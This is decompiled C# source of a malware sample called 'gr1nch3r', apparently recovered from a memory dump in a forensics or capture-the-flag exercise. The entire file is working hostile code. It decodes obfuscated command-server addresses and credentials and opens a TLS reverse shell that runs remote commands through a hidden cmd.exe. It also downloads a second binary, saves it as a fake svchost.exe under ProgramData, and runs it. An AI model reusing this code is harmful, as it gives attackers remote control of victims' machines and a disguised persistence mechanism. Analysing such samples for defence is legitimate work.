// Decompiled with JetBrains decompiler
// Type: gr1nch3r.Program
// Assembly: gr1nch3r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8329A4AA-CA7B-4AC4-8F31-4326FE5221C3
// Assembly location: C:\Users\james\Downloads\pid.5412.0x24ccd700000.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace gr1nch3r
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      Program.Update();
      byte[] buffer = new byte[1];
      string str1 = Program.Decode("t---e---b---.---r---e---v---j---r---u---g---e---r---i---b---.---1---2---0---2---g---a---r---i---q---n---.---e---3---u---p---a---1---e---t");
      TcpClient tcpClient = new TcpClient(str1, 443);
      using (SslStream sslStream = new SslStream((Stream) tcpClient.GetStream(), false, new RemoteCertificateValidationCallback(Program.ValidateServerCertificate), (LocalCertificateSelectionCallback) null))
      {
        sslStream.AuthenticateAsClient(str1);
        while (true)
        {
          string str2 = Program.ReadMessage(sslStream);
          if (!(str2 == "N0T_S4NT4"))
          {
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo()
              {
                FileName = "cmd.exe",
                Arguments = "/C " + str2,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
              }
            };
            process.Start();
            while (!process.StandardOutput.EndOfStream)
            {
              byte[] bytes = Encoding.ASCII.GetBytes(process.StandardOutput.ReadLine() + "\n");
              sslStream.Write(bytes);
            }
            sslStream.Write(buffer);
          }
          else
            break;
        }
      }
      tcpClient.Close();
    }

    public static bool ValidateServerCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      return true;
    }

    private static string ReadMessage(SslStream sslStream)
    {
      byte[] numArray = new byte[2048];
      StringBuilder stringBuilder = new StringBuilder();
      int num;
      do
      {
        num = sslStream.Read(numArray, 0, numArray.Length);
        Decoder decoder = Encoding.UTF8.GetDecoder();
        char[] chars = new char[decoder.GetCharCount(numArray, 0, num)];
        decoder.GetChars(numArray, 0, num, chars, 0);
        stringBuilder.Append(chars);
      }
      while (stringBuilder.ToString().IndexOf("<EOF>") == -1 && num != 0);
      return stringBuilder.ToString().Replace("<EOF>", "").Trim();
    }

    private static string Decode(string input)
    {
      input = input.Replace("---", "");
      char[] charArray = input.ToCharArray();
      Array.Reverse((Array) charArray);
      input = new string(charArray);
      return string.IsNullOrEmpty(input) ? input : new string(((IEnumerable<char>) input.ToCharArray()).Select<char, char>((Func<char, char>) (s => s < 'a' || s > 'z' ? (s < 'A' || s > 'Z' ? s : ((int) s + 13 > 90 ? (char) ((int) s - 13) : (char) ((int) s + 13))) : ((int) s + 13 > 122 ? (char) ((int) s - 13) : (char) ((int) s + 13)))).ToArray<char>());
    }

    private static void Update()
    {
      HttpClient httpClient = new HttpClient();
      httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", Program.Decode("x---I---T---o---f---I---2---L---h---S---2---D---m---y---0---p---u---1---T---q---m---y---z---p---b---A---x---B---b---A---z---o---c---W---3---M"));
      httpClient.BaseAddress = new Uri(Program.Decode("/---t---e---b---.---r---e---v---j---r---u---g---e---r---i---b---.---1---2---0---2---g---a---r---i---q---n---.---e---3---u---p---a---1---e---t---/---/---:---c---g---g---u"));
      HttpResponseMessage result = httpClient.GetAsync(Program.Decode("g---k---g---.---a---b---v---f---e---r---I---/---g---a---r---v---y---p")).Result;
      if (!result.IsSuccessStatusCode || !(result.Content.ReadAsStringAsync().Result != "1"))
        return;
      using (FileStream fileStream = new FileStream(Program.Decode("r---k---r---.---g---f---b---u---p---i---f---\\---g---s---b---f---b---p---e---v---Z---\\---n---g---n---Q---z---n---e---t---b---e---C---\\---:---P"), FileMode.CreateNew))
        httpClient.GetAsync(Program.Decode("r---k---r---.---e---3---u---p---1---e---t---/---g---a---r---v---y---p")).Result.Content.CopyToAsync((Stream) fileStream);
      Process.Start(Program.Decode("r---k---r---.---g---f---b---u---p---i---f---\\---g---s---b---f---b---p---e---v---Z---\\---n---g---n---Q---z---n---e---t---b---e---C---\\---:---P"));
      Environment.Exit(1);
    }
  }
}

